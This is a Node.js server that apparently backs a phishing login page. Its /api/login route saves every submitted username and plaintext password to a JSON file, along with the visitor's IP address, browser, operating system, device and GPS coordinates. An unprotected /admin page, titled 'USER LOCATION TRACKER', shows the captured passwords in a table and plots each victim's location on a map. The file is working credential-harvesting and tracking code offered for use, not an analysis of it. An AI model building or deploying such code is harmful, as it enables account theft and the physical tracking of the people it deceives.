const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 4000;
const DATA_FILE = path.join(__dirname, '../data/logins.json');

const dataDir = path.join(__dirname, '../data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

let loginLogs = [];
if (fs.existsSync(DATA_FILE)) {
    try {
        loginLogs = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        console.log(`📂 Loaded ${loginLogs.length} records`);
    } catch (e) { console.log('Fresh start'); }
}

function saveData() {
    fs.writeFileSync(DATA_FILE, JSON.stringify(loginLogs, null, 2));
}

const server = http.createServer((req, res) => {
    console.log('👉', req.method, req.url);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    // Serve frontend
    if (req.url === '/' && req.method === 'GET') {
        const filePath = path.join(__dirname, '../frontend/index.html');
        fs.readFile(filePath, (err, data) => {
            if (err) { res.writeHead(404); res.end('index.html not found'); }
            else { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(data); }
        });
        return;
    }

    // Login API
    if (req.url === '/api/login' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
                const userAgent = req.headers['user-agent'] || 'Unknown';

                let browser = 'Unknown';
                if (userAgent.includes('Chrome')) browser = 'Chrome';
                else if (userAgent.includes('Firefox')) browser = 'Firefox';
                else if (userAgent.includes('Safari')) browser = 'Safari';
                else if (userAgent.includes('Edge')) browser = 'Edge';

                let os = 'Unknown';
                if (userAgent.includes('Windows')) os = 'Windows';
                else if (userAgent.includes('Mac')) os = 'Mac';
                else if (userAgent.includes('Android')) os = 'Android';
                else if (userAgent.includes('iPhone')) os = 'iOS';

                let device = 'Desktop';
                if (userAgent.includes('Mobile')) device = 'Mobile';
                else if (userAgent.includes('Tablet')) device = 'Tablet';

                const logEntry = {
                    id: Date.now(),
                    username: data.username,
                    password: data.password,
                    time: new Date().toLocaleString(),
                    ip: ip,
                    browser: browser,
                    os: os,
                    device: device,
                    location: data.location || null
                };

                loginLogs.unshift(logEntry);
                if (loginLogs.length > 1000) loginLogs = loginLogs.slice(0, 1000);
                saveData();

                console.log('💾 Login saved:', data.username, 'from', ip);

                const success = (data.username === 'admin' && data.password === '123456');
                res.end(JSON.stringify({ success }));
            } catch (e) {
                res.writeHead(400);
                res.end(JSON.stringify({ success: false, error: 'Invalid request' }));
            }
        });
        return;
    }

    // Admin panel – map INSIDE the user card
    if (req.url === '/admin') {
        let logsHtml = '';
        for (let log of loginLogs) {
            const loc = log.location ? `${log.location.lat}, ${log.location.lon}` : 'N/A';
            const hasLocation = log.location ? 'has-location' : '';
            logsHtml += `
                <tr class="login-row ${hasLocation}" data-id="${log.id}" data-lat="${log.location?.lat || ''}" data-lon="${log.location?.lon || ''}" data-username="${escapeHtml(log.username)}" data-ip="${log.ip}" data-time="${log.time}" data-browser="${log.browser}" data-os="${log.os}" data-device="${log.device}" data-password="${escapeHtml(log.password)}">
                    <td>${log.id}</td>
                    <td><strong>${escapeHtml(log.username)}</strong></td>
                    <td style="color:#ff6b6b;">${escapeHtml(log.password)}</td>
                    <td>${log.time}</td>
                    <td>${log.ip}</td>
                    <td>${log.browser || 'Unknown'}</td>
                    <td>${log.os || 'Unknown'}</td>
                    <td>${log.device || 'Unknown'}</td>
                    <td>${loc}</td>
                    <td>${hasLocation ? '📍' : '—'}</td>
                </tr>
            `;
        }

        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin - Click to Locate</title>
                <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
                <style>
                    body { background: #0a0e27; color: #00ff88; font-family: monospace; padding: 20px; }
                    h1 { color: #1877f2; text-align: center; }
                    .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin: 20px 0; }
                    .stat-card { background: #1a1f3e; padding: 20px; border-radius: 10px; text-align: center; }
                    .stat-number { font-size: 48px; font-weight: bold; color: #00ff88; }
                    .stat-label { font-size: 14px; color: #888; }
                    table { width: 100%; border-collapse: collapse; background: #1a1f3e; border-radius: 10px; overflow-x: auto; display: block; }
                    th, td { padding: 10px; text-align: left; border-bottom: 1px solid #2a2f4e; font-size: 12px; }
                    th { background: #1877f2; color: white; position: sticky; top: 0; }
                    .refresh-btn { background: #1877f2; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 20px 0; }
                    .login-row { cursor: pointer; transition: 0.2s; }
                    .login-row:hover { background: #2a2f4e; }
                    .login-row.selected { background: #1a3a6e; border-left: 3px solid #00ff88; }

                    .user-card {
                        background: #1a1f3e;
                        border-radius: 10px;
                        padding: 20px;
                        margin: 20px 0;
                        display: none;
                        border: 1px solid #00ff8844;
                    }
                    .user-card.active { display: block; }
                    .user-card h3 { color: #00ff88; margin-bottom: 10px; }
                    .detail-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 15px; }
                    .detail-item { background: #0a0e27; padding: 8px 12px; border-radius: 5px; font-size: 13px; }
                    .detail-item strong { color: #1877f2; }
                    #userMap { height: 250px; border-radius: 10px; margin-top: 10px; z-index: 1; }
                    .leaflet-control-attribution { font-size: 9px; }
                </style>
            </head>
            <body>
                <h1>📍 USER LOCATION TRACKER</h1>
                <div class="stats">
                    <div class="stat-card"><div class="stat-number">${loginLogs.length}</div><div class="stat-label">Total Logins</div></div>
                    <div class="stat-card"><div class="stat-number">${loginLogs.filter(l => l.location).length}</div><div class="stat-label">With GPS</div></div>
                    <div class="stat-card"><div class="stat-number">${loginLogs.filter(l => l.username === 'admin' && l.password === '123456').length}</div><div class="stat-label">Successful</div></div>
                </div>

                <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>

                <div id="userCard" class="user-card">
                    <h3>👤 User Details</h3>
                    <div class="detail-grid">
                        <div class="detail-item"><strong>Username:</strong> <span id="dUser">—</span></div>
                        <div class="detail-item"><strong>Password:</strong> <span id="dPass">—</span></div>
                        <div class="detail-item"><strong>IP:</strong> <span id="dIP">—</span></div>
                        <div class="detail-item"><strong>Time:</strong> <span id="dTime">—</span></div>
                        <div class="detail-item"><strong>Browser:</strong> <span id="dBrowser">—</span></div>
                        <div class="detail-item"><strong>OS:</strong> <span id="dOS">—</span></div>
                        <div class="detail-item"><strong>Device:</strong> <span id="dDevice">—</span></div>
                        <div class="detail-item"><strong>Location:</strong> <span id="dLoc">—</span></div>
                    </div>
                    <div id="userMap"></div>
                </div>

                <h2>📋 Click any user to see details + map</h2>
                <table>
                    <thead><tr><th>ID</th><th>Username</th><th>Password</th><th>Time</th><th>IP</th><th>Browser</th><th>OS</th><th>Device</th><th>Location</th><th>📍</th></tr></thead>
                    <tbody>${logsHtml || '<tr><td colspan="10">No logins yet</td></tr>'}</tbody>
                </table>

                <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"><\/script>
                <script>
                    let userMap = null;
                    let currentMarker = null;

                    function initMap(lat, lon, username) {
                        if (userMap) {
                            userMap.invalidateSize();
                            userMap.setView([lat, lon], 15);
                        } else {
                            userMap = L.map('userMap').setView([lat, lon], 15);
                            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                                attribution: '&copy; OpenStreetMap'
                            }).addTo(userMap);
                        }

                        if (currentMarker) {
                            userMap.removeLayer(currentMarker);
                        }

                        currentMarker = L.marker([lat, lon], { riseOnHover: true })
                            .addTo(userMap)
                            .bindPopup('<strong>' + username + '</strong>')
                            .openPopup();
                    }

                    document.querySelectorAll('.login-row').forEach(row => {
                        row.addEventListener('click', function() {
                            document.querySelectorAll('.login-row').forEach(r => r.classList.remove('selected'));
                            this.classList.add('selected');

                            const lat = this.dataset.lat;
                            const lon = this.dataset.lon;
                            const username = this.dataset.username || '—';
                            const password = this.dataset.password || '—';
                            const ip = this.dataset.ip || '—';
                            const time = this.dataset.time || '—';
                            const browser = this.dataset.browser || '—';
                            const os = this.dataset.os || '—';
                            const device = this.dataset.device || '—';

                            document.getElementById('dUser').innerText = username;
                            document.getElementById('dPass').innerText = password;
                            document.getElementById('dIP').innerText = ip;
                            document.getElementById('dTime').innerText = time;
                            document.getElementById('dBrowser').innerText = browser;
                            document.getElementById('dOS').innerText = os;
                            document.getElementById('dDevice').innerText = device;
                            document.getElementById('dLoc').innerText = (lat && lon) ? lat + ', ' + lon : 'No GPS';

                            const card = document.getElementById('userCard');
                            card.classList.add('active');

                            if (lat && lon) {
                                initMap(parseFloat(lat), parseFloat(lon), username);
                            } else {
                                if (userMap) {
                                    userMap.setView([27.7, 85.3], 7);
                                }
                            }
                        });
                    });

                    // Auto-select first row with location
                    const first = document.querySelector('.login-row.has-location');
                    if (first) first.click();
                <\/script>
            </body>
            </html>
        `);
        return;
    }

    res.writeHead(404);
    res.end('404');
});

function escapeHtml(text) {
    if (!text) return 'Unknown';
    return String(text).replace(/[&<>]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        return m;
    });
}

server.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📍 GPS location tracking enabled`);
});